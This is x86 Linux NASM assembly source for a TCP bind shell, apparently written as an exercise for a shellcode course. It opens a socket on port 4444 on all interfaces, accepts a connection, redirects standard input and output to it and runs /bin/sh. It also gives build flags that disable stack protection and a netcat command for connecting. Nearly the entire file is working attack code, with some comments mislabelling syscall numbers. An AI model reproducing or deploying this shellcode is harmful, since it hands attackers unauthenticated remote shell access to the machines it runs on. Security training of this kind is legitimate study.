;Program: Tcp_Bind_Shell.nasm
;Author : Bhanu Teja
;SLAE-1426

;Compilation & Execution Steps:

;# nasm -f elf32 tcp_bind_shell .nasm
;# ld tcp_bind_shell.o -o tcp_bind_shell  -fno-stack-protector -shared -z execstack
;# ./tcp_bind_shell
;# connect to port using netcat # nc 127.0.0.1 4444

;----start----;

global _start

section .text
_start:

;setting all the registers to 0

xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

;Creating a socket: socket(AF_INET, SOCK_STREAM, IP_PROTO_IP)

mov al, 0x66 	; socket syscall 102 | Hex equivalent is 0x66
mov bl, 0x1  	; socket syscall function SOCKET is 1 | #define SYS_SOCKET 1 

; we need to push AF_INET, SOCK_STREAM, IP_PROTO_IP as a single argument. This can be done by pushing them onto stack in the reverse order

push ecx     	; ecx value is zero and is pushed onto the stack as value for IP_PORTO_IP
push ebx     	; ebx value is 1 and is pushed onto stack as value for SOCK_STREAM
push 0x2     	; AF_INET value is 2 and is pushed on to the stack
mov ecx, esp 	; esp is pushed into ecx and now points to arguments
int 0x80     	; execute

mov edi, eax    ; sockfd is now moved into edi

;Binding the socket: bind(host_sock, (sin.family=AF_INET, sin_port=4444, sin_addr=0.0.0.0), sizeof(host_addr));

mov al, 0x66 	; socket syscall 102 | Hex equivalent is 0x66
mov bl, 0x2	; socket syscall function BIND is 2 | #define SYS_BIND 2
xor edx, edx	; zeroing edx
push edx	; edx onto the stack for host_addr INADDR_ANY = 0
push word 0x5c11; sin.port=4444 | hex equivalent is 0x115c => 0x5c11 Big Endian
push bx		; AF_INET value is 2
mov ecx, esp	; ecx points to args
push 0x10	; sizeof host
push ecx	; push address onto stack
push edi	; edi has the sockfd
mov ecx, esp	; point ecx to top of stack
int 0x80	; execute


;Creating a listener

mov al, 0x66	;
mov bl, 0x4	; socket syscall function LISTEN is 3 | #define SYS_LISTEN 4
push edx	; edx = 0; backlog=0
push edi	; edi has the sockfd onto stack
mov ecx, esp
int 0x80

;Accept connection

mov al,0x66	; socketcall = 102 Hex => 0x66
mov bl,0x5	; SYS_ACCEPT = 5
push edx	; edx=0 ; sizeof(sockaddr) = NULL
push edx	; edx=0	; *sockaddr = NULL 
push edi	; sockfd is in edi
mov ecx, esp	; ecx points to top of stack
int 0x80	;


;send and recevie data using I/O fd's


xchg ebx, eax	; moved the client connection fd into edi
xor ecx, ecx	; ecx is zero acts as loop counter

loop:
	mov al, 0x3f	; dup2 value 63 | Hex eqivalent is 0x3f
	int 0x80	; execute 
	inc cl		; increment cl
	cmp cl, 0x4	; comapre if cl is eql to 4
	jne loop	; if not equal jmp to loop


;Execute shellcode

xor edx, edx	; edx is 0
push edx	; push 0 onto stack null terminator
mov al, 0xb	; execve 11 | Hex is 0xb
push 0x68732f2f	; 
push 0x6e69622f	;
mov ebx, esp	; ebx points to top of stack
mov ecx, edx	; ecx = edx = 0
int 0x80
